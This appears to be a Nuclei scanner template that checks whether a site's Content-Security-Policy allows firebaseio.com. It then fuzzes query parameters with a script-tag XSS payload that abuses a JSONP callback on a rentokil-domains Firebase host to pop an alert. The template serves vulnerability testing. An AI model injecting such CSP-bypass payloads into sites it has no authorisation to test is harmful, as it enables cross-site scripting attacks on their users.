id: firebaseio-rentokil-csp-bypass

info:
  name: Content-Security-Policy Bypass - Firebaseio Rentokil
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,firebaseio-rentokil,vuln

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
          - "firebaseio.com"
        condition: and
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: firebaseio_rentokil_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "firebaseio_rentokil_csp_xss == true"
